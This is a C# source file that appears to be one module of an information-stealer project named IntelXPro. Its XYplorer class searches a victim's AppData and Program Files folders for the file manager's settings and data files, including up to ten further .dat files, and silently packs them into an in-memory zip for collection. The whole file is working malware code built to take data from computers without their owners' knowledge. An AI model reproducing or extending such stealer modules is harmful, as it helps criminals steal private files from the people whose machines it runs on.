using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class XYplorer : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "XYplorer");
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "XYplorer");
            string programFilesX86Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "XYplorer");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "XYplorer";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(programFilesPath))
            {
                foundData |= CollectFromDirectory(programFilesPath, "ProgramFiles", zip, counterApplications);
            }

            if (Directory.Exists(programFilesX86Path))
            {
                foundData |= CollectFromDirectory(programFilesX86Path, "ProgramFilesX86", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "XYplorer.ini",
                    "fvs.dat",
                    "ks.dat",
                    "tag.dat",
                    "pv.dat"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, "Data", configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\XYplorer\\{location}\\Data\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string dataPath = Path.Combine(basePath, "Data");
                if (Directory.Exists(dataPath))
                {
                    string[] datFiles = Directory.GetFiles(dataPath, "*.dat", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in datFiles.Take(10))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\XYplorer\\{location}\\Data\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
